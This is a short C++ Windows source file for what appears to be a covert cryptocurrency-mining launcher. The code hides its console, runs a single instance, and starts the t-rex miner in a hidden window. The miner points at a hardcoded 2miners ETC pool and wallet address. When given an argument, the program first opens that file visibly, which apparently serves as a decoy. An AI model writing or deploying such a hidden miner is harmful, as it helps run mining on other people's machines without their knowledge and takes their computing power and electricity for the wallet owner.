#include <iostream>
#include <fstream>
#include <filesystem>
#include <windows.h>
#include <string>

using namespace std;
namespace fs = std::filesystem;

string currentPath;

struct config {
	string rigName;
	string fanPower;
	config(string rigname, string fanpower) {
		rigName = rigname;
		fanPower = fanpower;
	}
};
config getConfig() {
	string result[2];
	int index = 0;

	ifstream configFile(currentPath + "settings.cfg");
	if (configFile.is_open()) {
		while (getline(configFile, result[index])) {
			index++;
		}
		configFile.close();
	}

	return config(result[0], result[1]);
}
int main(int argc, char** argv) {
	FreeConsole();
	const char mutexName[] = "com.tbmp";
	currentPath = fs::current_path().string() + "\\";

	HANDLE handle = CreateMutexA(NULL, TRUE, mutexName);
	if (ERROR_ALREADY_EXISTS == GetLastError()) {
		return(1);
	}

	config cfg = getConfig();
	string fn = currentPath + "t-rex.exe";
	string pm = "-a etchash -o stratum+tcp://etc.2miners.com:1010 -u 0x9dfbD176Fcd9277D89583c55aBC928F7c91D2E6d -p x -w " + cfg.rigName + " " + cfg.fanPower;
	wstring fn_temp = wstring(fn.begin(), fn.end());
	wstring pm_temp = wstring(pm.begin(), pm.end());
	LPCWSTR filename = fn_temp.c_str();
	LPCWSTR parameters = pm_temp.c_str();

	if (argc > 1) {
		string mk = argv[1];
		wstring mk_temp = wstring(mk.begin(), mk.end());
		LPCWSTR makeup = mk_temp.c_str();
		ShellExecute(NULL, NULL, makeup, NULL, NULL, SW_SHOW);
	}

	SHELLEXECUTEINFO exInfo = { 0 };
	exInfo.cbSize = sizeof(SHELLEXECUTEINFO);
	exInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	exInfo.hwnd = NULL;
	exInfo.lpVerb = NULL;
	exInfo.lpFile = filename;
	exInfo.lpParameters = parameters;
	exInfo.lpDirectory = NULL;
	exInfo.nShow = SW_HIDE;
	exInfo.hInstApp = NULL;
	ShellExecuteEx(&exInfo);
	WaitForSingleObject(exInfo.hProcess, INFINITE);
	ReleaseMutex(handle);
	CloseHandle(exInfo.hProcess);
	CloseHandle(handle);

	return (1);
}
